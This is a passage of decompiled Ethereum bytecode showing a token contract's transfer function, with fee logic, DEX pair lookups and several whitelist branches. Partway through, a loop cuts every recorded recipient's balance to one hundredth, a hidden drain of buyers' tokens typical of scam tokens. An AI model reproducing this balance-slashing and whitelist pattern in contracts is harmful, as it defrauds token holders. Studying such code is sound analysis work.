                                              mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                if arg2 * _fee / 100 > 0:
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 * _fee / 100,
                                                  mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  0,
                            return 1, mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)]
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if stor16[address(msg.sender)]:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if stor16[address(arg1)]:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if arg1 == this.address:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if ext_call.return_data[12 len 20] != msg.sender:
                        if msg.sender == address(ext_call.return_data[0]):
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    else:
                        if stor16[address(arg1)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    if stor18:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if not arg2:
                        require arg2 <= _maxTxAmount
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 268] = this.address
                        mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2,
                                          mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                        stor19.length++
                        stor19[stor19.length].field_0 = arg1
                        stor19[stor19.length].field_256 = arg2
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2,
                                      mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                    else:
                        if arg2 and _fee > -1 / arg2:
                            revert with 'NH{q', 17
                        if not arg2:
                            revert with 'NH{q', 18
                        if arg2 * _fee / arg2 != _fee:
                            revert with 0, 'SafeMath: multiplication overflow'
                        require arg2 <= _maxTxAmount
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 268] = this.address
                        mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < arg2 * _fee / 100:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[0] += arg2 * _fee / 100
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 - (arg2 * _fee / 100),
                                          mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            if arg2 * _fee / 100 > 0:
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 * _fee / 100,
                                              mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              0,
                            return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                        stor19.length++
                        stor19[stor19.length].field_0 = arg1
                        stor19[stor19.length].field_256 = arg2
                        if arg2 < arg2 * _fee / 100:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                            revert with 'NH{q', 17
                        balanceOf[0] += arg2 * _fee / 100
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2 - (arg2 * _fee / 100),
                                      mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                        if arg2 * _fee / 100 > 0:
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 * _fee / 100,
                                          mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          0,
                    return 1, mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)]
                idx = 0
                while idx < stor19.length:
                    mem[0] = stor19[idx].field_0
                    mem[32] = 13
                    _763 = mem[64]
                    mem[64] = mem[64] + 64
                    mem[_763] = 26
                    mem[_763 + 32] = 'SafeMath: division by zero'
                    if idx >= stor19.length:
                        revert with 'NH{q', 50
                    mem[0] = stor19[idx].field_0
                    mem[32] = 13
                    balanceOf[stor19[idx].field_0] = balanceOf[stor19[idx].field_0] / 100
                    if idx == -1:
                        revert with 'NH{q', 17
                    idx = idx + 1
                    continue 
                stor19.length = 0
                mem[0] = 19
                idx = 0
                while 2 * stor19.length > idx:
                    stor19[idx].field_0 = 0
                    stor19[idx].field_256 = 0
                    idx = idx + 2
                    continue 
                require ext_code.size(address(stor20.field_8))
                staticcall address(stor20.field_8).factory() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7061 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _7067 = mem[_7061]
                require mem[_7061] == mem[_7061 + 12 len 20]
                require ext_code.size(address(stor20.field_8))
                staticcall address(stor20.field_8).WETH() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7085 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _7091 = mem[_7085]
                require mem[_7085] == mem[_7085 + 12 len 20]
                mem[mem[64] + 4] = this.address
                mem[mem[64] + 36] = address(_7091)
                require ext_code.size(address(_7067))
                staticcall address(_7067).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(_7091)
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7109 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                require mem[_7109] == mem[_7109 + 12 len 20]
                if arg1 != mem[_7109 + 12 len 20]:
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).factory() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7163 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7181 = mem[_7163]
                    require mem[_7163] == mem[_7163 + 12 len 20]
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).WETH() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7229 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7259 = mem[_7229]
                    require mem[_7229] == mem[_7229 + 12 len 20]
                    mem[mem[64] + 4] = this.address
                    mem[mem[64] + 36] = address(_7259)
                    require ext_code.size(address(_7181))
                    staticcall address(_7181).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(_7259)
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7415 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7484 = mem[_7415]
                    require mem[_7415] == mem[_7415 + 12 len 20]
                    if mem[_7415 + 12 len 20] != msg.sender:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7850 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7850 + 32 len mem[_7850]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if msg.sender == address(_7484):
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7880 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7880 + 32 len mem[_7880]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor16[address(arg1)]:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                else:
                    mem[0] = msg.sender
                    mem[32] = 16
                    if stor16[address(msg.sender)]:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7247 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7247 + 32 len mem[_7247]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
